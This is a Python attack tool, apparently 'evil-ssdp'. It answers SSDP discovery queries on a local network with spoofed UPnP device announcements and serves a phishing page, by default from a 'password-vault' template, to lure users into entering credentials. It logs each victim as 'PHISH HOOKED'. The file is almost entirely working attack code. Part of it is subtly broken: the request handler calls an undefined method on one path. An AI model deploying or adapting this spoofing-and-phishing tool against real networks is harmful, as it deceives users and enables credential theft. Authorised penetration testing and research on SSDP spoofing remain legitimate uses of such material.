#!/usr/bin/env python3

from multiprocessing import Process
from string import Template
from http.server import BaseHTTPRequestHandler
from email.utils import formatdate
import os,sys,re,argparse,socket,struct,time,re,socketserver;

banner = r'''
___________     .__.__    _________ _________________ __________
\_   _____/__  _|__|  |  /   _____//   _____/\______ \\______   \
 |    __)_\  \/ /  |  |  \_____  \ \_____  \  |    |  \|     ___/
 |        \\   /|  |  |__/        \/        \ |    `   \    |
/_______  / \_/ |__|____/_______  /_______  //_______  /____|
        \/                      \/        \/         \/

...by initstring
'''

print(banner)

# Set up some nice colors
class bcolors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    ORANGE = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
xmlBox = bcolors.GREEN +    '[XML REQUEST]  ' + bcolors.ENDC
phishBox = bcolors.RED +    '[PHISH HOOKED] ' + bcolors.ENDC 

# Handle arguments before moving on....
parser = argparse.ArgumentParser()
parser.add_argument('interface', type=str, help='Network interface to listen on.', action='store')
parser.add_argument('-p', '--port', type=str, help='Port for HTTP server. Defaults to 8888.', action='store')
parser.add_argument('-t', '--template', type=str, help='Name of a folder in the templates directory. \
                     Defaults to "password-vault". This will determine xml and phishing pages used."', action='store')
args = parser.parse_args()

interface = args.interface
if args.port:
    localPort = int(args.port)
else:
    localPort = 8888

if args.template:
    templateDir = os.path.dirname(__file__) + '/templates/' + args.template
    if not os.path.isdir(templateDir):
        print(warnBox + "Sorry, that template directory does not exist. Please double-check and try again.")
        sys.exit()
else:
    templateDir = os.path.dirname(__file__) + '/templates/password-vault'


class SSDPListener:
    def __init__(self, localIp, localPort):
        self.sock = None
        self.knownHosts = []
        self.localIp = localIp
        self.localPort = localPort
        ssdpPort = 1900			# This is defined by the SSDP spec, do not change
        mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
        serverAddress = ('', ssdpPort)
        knownHosts = []
        
        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Bind to the server address
        self.sock.bind(serverAddress)
        
        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcastGroup)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.localIp))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)

def MakeHTTPClass(deviceXML, serviceXML, phishPage):
    class DeviceDescriptor(BaseHTTPRequestHandler):
        def do_GET(self):
            localIp,localPort = self.server.server_address
            if self.path == '/ssdp/device-desc.xml':
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(deviceXML.encode())
            elif self.path == '/ssdp/service-desc.xml':
                xmlFile = self.buildServiceXml()
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(serviceXML.encode())
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(phishPage.encode())
    
        def log_message(self, format, *args):
            address = self.address_string()
            headers = self.headers['user-agent']
            verb = self.command
            path = self.path
            if 'xml' in self.path:
                print(xmlBox + "Host: {}, User-Agent: {}".format(address, headers))
                print("               {} {}".format(verb, path))
            else:
                print(phishBox + "Host: {}, User-Agent: {}".format(address, headers))
                print("               {} {}".format(verb, path))

    return DeviceDescriptor 

def get_ip(interface):
    try:
        localIp = re.findall(r'inet (.*?)/', os.popen('ip addr show ' + interface).read())[0]
        broadcast = re.findall(r'brd (.*?) ', os.popen('ip addr show ' + interface).read())[0]
    except Exception:
        print(warnBox + "Could not get network interface info. Please check and try again.")
        sys.exit()
    return localIp

def process_data(listener, data, address):
    (remoteIp,remotePort) = address
    if 'M-SEARCH' in str(data):
        try:
            requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip()
        except:
            requestedST = 'ssdp:all'
        if address[0] not in listener.knownHosts:
            print(msearchBox + "New Host {}, Service Type: {}".format(remoteIp, requestedST))
            listener.knownHosts.append(address[0])
        send_location(listener, address, requestedST)

def send_location(listener, address, requestedST):
    URL = 'http://{}:{}/ssdp/device-desc.xml'.format(localIp, localPort)
    lastSeen = str(time.time())
    dateFormat = formatdate(timeval=None, localtime=False, usegmt=True)
    reply = 'HTTP/1.1 200 OK\r\n'
    reply += 'CACHE-CONTROL: max-age=1800\r\n'
    reply += 'DATE: ' + dateFormat + '\r\n'
    reply += 'EXT: \r\n'
    reply += 'LOCATION: ' + URL + '\r\n'
    reply += 'SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1\r\n'
    reply += 'ST: {}\r\n'.format(requestedST)
    reply += 'USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice\n'
    reply += 'BOOTID.UPNP.ORG: 0\r\n'
    reply += 'CONFIGID.UPNP.ORG: 1\r\n'
    reply += '\r\n\r\n'
    reply = bytes(reply, 'utf-8')
    listener.sock.sendto(reply, address)

def buildDeviceXML():
    variables = {'localIp': localIp,
		 'localPort': localPort}
    fileIn = open(templateDir + '/device.xml')
    template = Template(fileIn.read())
    xmlFile = template.substitute(variables)
    return xmlFile

def buildServiceXML():
    variables = {'localIp': localIp,
		 'localPort': localPort}
    fileIn = open(templateDir + '/service.xml')
    template = Template(fileIn.read())
    xmlFile = template.substitute(variables)
    return xmlFile

def buildPhish():
    variables = {'localIp': localIp}
    fileIn = open(templateDir + '/present.html')
    template = Template(fileIn.read())
    phishPage = template.substitute(variables)
    return phishPage

def serve_descriptor(deviceXML, serviceXML, phishPage):
    print(okBox + "Serving device descriptor using {} at {} on port {}".format(interface, localIp, localPort))
    HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage)
    descriptor = socketserver.TCPServer((localIp, localPort), HTTPClass)
    descriptor.serve_forever()

def listen_msearch():
    print(okBox + "Listening for MSEARCH queries using {}.".format(interface))
    listener = SSDPListener(localIp, localPort)
    while True:
        data, address = listener.sock.recvfrom(1024)
        process_data(listener, data, address)


def main():
    global localIp
    localIp = get_ip(interface)
    deviceXML = buildDeviceXML()
    serviceXML = buildServiceXML()
    phishPage = buildPhish()
    Process(target=serve_descriptor, args=(deviceXML, serviceXML, phishPage)).start()
    listen_msearch()
    

if __name__ == "__main__":
    main()

